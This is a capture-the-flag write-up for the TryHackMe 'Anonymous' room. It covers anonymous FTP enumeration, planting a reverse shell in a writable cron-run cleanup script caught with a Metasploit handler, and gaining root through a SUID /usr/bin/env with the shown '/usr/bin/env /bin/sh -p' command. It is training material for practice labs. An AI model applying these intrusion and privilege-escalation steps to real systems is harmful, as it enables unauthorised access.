# Anonymous
[TryHackMe room link](https://tryhackme.com/room/anonymous)

# Informations about the room 

> Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

# Open ports

21 vsFTPd 3.0.3 anonymous login

22 OpenSSH 7.6p1

139 samba

445 samba

# Enumeration

Since we have anonymous access enabled in the ftp server we need to take a look at it:

There is a hidden directory called `/scripts`

Inside there are 3 files:

`clean.sh`

```bash
!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

`removed_files.log`

`to_do.txt`


We can try to mount the ftp share to our machine

`curlftpfs anonymous@10.10.27.64 mount`

We have write access to the script

Since it's probably inside a cronjob we can modify it by adding a reverse shell

Netcat for some reason does not work properly, it drops the shell almost instantly

So i tried to use the metasploit handler

`use exploit/multi/handler`

Set the `LHOST` and `LPORT`

This time the shell it's stable

# Privilege escalation

After enumerating linpeas found a [SUID in /usr/bin/env](https://gtfobins.github.io/gtfobins/env/)

`-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env`

```console
/usr/bin/env /bin/sh -p
# id
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# cat /root/root.txt
cat /root/root.txt
REDACTED
```

